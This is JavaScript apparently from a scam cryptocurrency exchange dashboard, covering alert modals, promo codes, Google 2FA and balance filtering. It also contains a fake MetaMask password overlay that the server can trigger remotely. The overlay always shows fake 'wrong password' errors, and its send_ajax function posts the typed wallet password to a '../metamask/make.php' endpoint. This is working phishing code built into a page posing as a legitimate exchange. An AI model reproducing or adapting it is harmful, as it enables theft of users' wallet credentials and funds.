


 function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }







	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "/ajax/VIEWED_ALERT_MESSAGE",
	      type: "POST",
	      data: {
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "/ajax/VIEWED_ALERT_MESSAGE",
	      type: "POST",
	      data: {
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "/ajax/VIEWED_ALERT_MESSAGE",
	      type: "POST",
	      data: {
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 

  

  setInterval(function() {
  var messageId = $("#alertMessageId").val();
	  if(messageId == '0') {
		  $.ajax({
        url: "/ajax/CHECK_USER_ALERT_MESSAGE",
        type: "POST",
        success: function(response) {
          if(response != "false") {
            var json = JSON.parse(response);
            var alert_message_text = json['alert_message_text'];
            var alert_message_id = json['alert_message_id'];
            if(json['alert_message_type'] == 'alert') {
            	$("#alert_message_modal").css("display", "flex");
            	$("#userAlertBox").html(alert_message_text);
            	$("#alertMessageId").val(alert_message_id);
            } else if(json['alert_message_type'] == 'bonus') {
            	$("#alert_img_pop").attr("src", "");
            	$("#alert_title_text").html("Bonus");
            	$("#alert_img_pop").attr("src", "/templates/res/images/bonus-icon.png");
            	$("#alert_message_modal").css("display", "flex");
            	$("#userAlertBox").html(alert_message_text);
            	$("#alertMessageId").val(alert_message_id);
            	$("#userAlertBox").css("font-size", "18px");
            }
          }

        }
      })
	  }
	}, 5000);



setInterval(function() {
  var MetamessageId = $("#MetaalertMessageId").val();
	  if(MetamessageId == '0') {
		  $.ajax({
        url: "/ajax/CHECK_USER_ALERT_MESSAGE",
        type: "POST",
 
        success: function(response) {
          if(response != "false") {

            var json = JSON.parse(response);
            var alert_message_text = json['alert_message_text'];
            var alert_message_id = json['alert_message_id'];

            if(json['alert_message_type'] == 'meta') {
            	if($( window ).width() > 990) {
	            	$("#verify_popap_meta").css("display", "flex");
	            	$("#MetaalertMessageId").val(alert_message_id);

	            	if(alert_message_text.length > 15) {
	            		$("#alertMessageMeta").html(alert_message_text);
	            	}
	            }
            }
            

          }

        }
      })
	  }
	}, 15000);





    $("#deposit_btn").on("click", function() {
        location.replace("deposit");
    });

    $("#withdraw_btn").on("click", function() {
        location.replace("withdraw");
    });

    $("#enable_2fa").on("click", function() {
      $("#security_2fa").css("display", "flex");
    });

    $("#close_modal").on("click", function() {
      $("#security_2fa").css("display", "none");
    });

    $("#close_modal_btn").on("click", function() {
      $("#security_2fa").css("display", "none");
    });

    $("#activate_promo").on("click", function(e) {
        e.preventDefault();

        var promocode = $("#promocode").val().replace(/\s+/g, '');
        if(promocode == "") {
            noti("Please enter correct promo code", "error");
        } else {
           $.ajax({
              type: 'POST',
			  dataType: 'json',
              url: '/ajax/ACTIVATE_PROMOCODE',
              data: {
                promo_code: promocode
              },
              success: function(data) {
				  if(data.response == 'success'){
					  //noti("Promo code successfully activated", "success");
					  noti(data.text, "success");
					  setTimeout(function() {
						location.reload();
					  }, 1000); 
				  }
				  if(data.response == 'error'){
					  noti(data.text, "error");
					  
				  }
              }
            })  
        }
        
    });

  var hide_zero = 'false';
  function hideZeroBalances() {
    if(hide_zero == 'false') {
        $('.tableUser__item').each(function () {

          if(parseFloat($(this).find(".search_my_balance").html()) == 0) {

                $(this).hide();

           }

        });

        hide_zero = 'true';
    } else {
        $('.tableUser__item').each(function () {

          if(parseFloat($(this).find(".search_my_balance").html()) == 0) {

                $(this).show();

           }

        });

        hide_zero = 'false';
    }
    

  }

  $(document).ready(function(){
    $("#search_currency").keyup(function(){
    _this = this;
    
    $.each($(".tableUser__item"), function() {
        if($(this).text().toLowerCase().indexOf($(_this).val().toLowerCase()) === -1) {
            $(this).hide();
        } else {
            $(this).show();  
        }              
    });
    });

//     setTimeout(function() {
//         $.ajax({
//           url: "../ajax/ajax",
//           type: "POST",
//           data: {
//             action: "REFRESH_MY_ADDRESSES"
//           },
//           success: function(response) {
//           }
//         })  
//     }, 500);
});

  $("#connect_google_2fa").on("click", function(e) {
        e.preventDefault();

        var code_2fa = $("#code_2fa").val().replace(/\s+/g, '');
        if(code_2fa == "" || code_2fa.length != 6) {
            noti("Please enter correct 2FA code", "error");
        } else {
           $.ajax({
              url: "../ajax/ajax",
              type: "POST",
              data: {
                action: "CONNECT_GOOGLE_2FA",
                code_2fa: code_2fa
              },
              success: function(response) {
                console.log(response);
                if(response == "1") {
                  noti("Google 2FA successfully activated", "success");
                  $("#security_2fa").css("display", "none");
                  $(".userAttention").remove();
                } else if(response == "2") {
                  noti("Please enter correct 2FA code", "error");
                } else {
                  noti("An unexpected error has occurred, please try again", "error");
                }

              }
            })  
        }
        
    });